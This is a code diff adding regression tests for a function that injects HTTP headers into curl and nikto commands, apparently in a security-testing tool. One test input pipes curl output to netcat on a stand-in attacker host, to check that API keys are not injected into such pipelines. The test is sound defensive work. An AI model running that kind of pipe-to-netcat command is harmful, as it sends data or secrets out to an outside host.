@@ -364,6 +364,58 @@ describe("applyHeadersToShellCommand", () => {
     expect(r.command).toContain(`\\$VAR`);
     expect(r.command).toContain("\\`cmd\\`");
   });
+
+  it("fails closed on pipelines without whitespace before the operator", () => {
+    // Regression: COMMAND_SPLIT regex required `(?:^|\s)` before the
+    // operator, so `curl url|nc atk 9999` slipped past the pipeline
+    // check and headers got injected into a compound command.
+    const session = makeSession({
+      config: { headers: { "X-API-Key": "abc" } },
+    });
+    const r = applyHeadersToShellCommand(
+      "curl https://example.com/|nc attacker.example 9999",
+      session,
+      ["example.com"],
+    );
+    expect(r.status).toBe("unknown-tool");
+    expect(r.tool).toBeNull();
+  });
+
+  it("does not treat operator characters inside quoted args as pipelines", () => {
+    // The fix for the no-whitespace pipeline case must not regress on
+    // legitimate commands whose quoted values contain `|`, `;`, or `&`.
+    const session = makeSession({
+      config: { headers: { "X-API-Key": "abc" } },
+    });
+    const r = applyHeadersToShellCommand(
+      `curl -H "X-Custom: a|b;c&d" https://example.com/`,
+      session,
+      ["example.com"],
+    );
+    expect(r.status).toBe("injected");
+    expect(r.tool).toBe("curl");
+  });
+
+  it("emits a literal `\\n` (not a raw newline) for nikto -headers", () => {
+    // Regression: injectNikto previously embedded a 0x0A byte, which
+    // both breaks line-based persistent shells and is not what nikto
+    // expects as its header separator.
+    const session = makeSession({
+      config: { headers: { "X-One": "1", "X-Two": "2" } },
+    });
+    const r = applyHeadersToShellCommand(
+      "nikto -h https://example.com",
+      session,
+      ["example.com"],
+    );
+    expect(r.status).toBe("injected");
+    expect(r.tool).toBe("nikto");
+    expect(r.command).not.toContain("\n");
+    // shellQuote doubles the backslash so the surrounding shell strips
+    // exactly one layer, leaving nikto with the literal two-byte `\n`
+    // sequence as its header separator.
+    expect(r.command).toContain("X-One: 1\\\\nX-Two: 2");
+  });
 });
 
 // ---------------------------------------------------------------------------
